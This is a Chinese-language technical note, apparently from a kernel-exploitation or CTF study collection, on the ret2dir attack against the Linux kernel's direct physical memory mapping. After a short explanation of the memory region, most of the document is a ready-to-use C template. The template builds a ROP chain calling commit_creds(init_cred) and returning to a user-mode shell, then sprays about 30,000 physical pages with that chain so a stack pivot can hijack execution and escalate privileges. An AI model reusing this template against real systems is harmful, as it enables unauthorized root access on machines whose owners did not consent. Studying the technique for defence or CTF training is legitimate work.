# ret2dir

## 概述

查看内存映射[mm.txt](https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt)

可以看到这样一块64TB大小的映射区

```
ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
```

这块空间将物理内存映射到虚拟地址空间中，内核可以直接访问，而在用户空间中，内存的映射也会在这块区域中找到

那么在整个虚拟内存中，用户空间和内核空间会存在相同的物理空间映射到不同的虚拟内存，通过这块空间，内核就可以直接访问用户空间

## ROP攻击

在物理映射页可执行的版本中可以直接写入shellcode，否则只能泄露地址然后部署ROP

1. 利用物理页喷射，分配出大量的内存页，并在这些内存页上部署ROP链
2. 利用栈迁移到 ffff888000000000 ~ ffffc87fffffffff 上，可以选用0xffff888000000000 + 0x3000000~0x7000000的页
3. 当迁移的内存页在前面喷射的内存页中，即可劫持执行流提权

## 示例模板

```C
void ret2dir(u64 *page)
{
    int i = 0;
    // 简单gadget，通常用于处理栈迁移或者其他
    for (; i < 0x10; i++)
    {
        page[i] = ret;
    }

    // 提权
    page[i++] = pop_rdi_ret;
    page[i++] = init_cred;
    page[i++] = commit_creds;

    // 恢复用户态
    page[i++] = swapgs_restore_regs_and_return_to_usermode;
    page[i++] = 0;
    page[i++] = 0;
    page[i++] = &kernel_shell;
    page[i++] = user_cs;
    page[i++] = user_rflags;
    page[i++] = user_sp;
    page[i++] = user_ss;
}

// 物理页喷射
#define spray_max 30000 // 喷射的物理页数量，通常在15000~30000合适，在内存足够的情况下越多越好
u64 *physmap_spray_arr[spray_max];
page_size = sysconf(_SC_PAGESIZE);
physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
ret2dir(physmap_spray_arr[0]);
for (int i = 1; i < spray_max; i++)
{
    physmap_spray_arr[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (physmap_spray_arr[i] == MAP_FAILED)
    {
        printf("mmap failed\n");
        exit(0);
    }
    memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
}
printf("mmap success\n");
```

## 杂项

获取物理页大小`sysconf(_SC_PAGESIZE);`
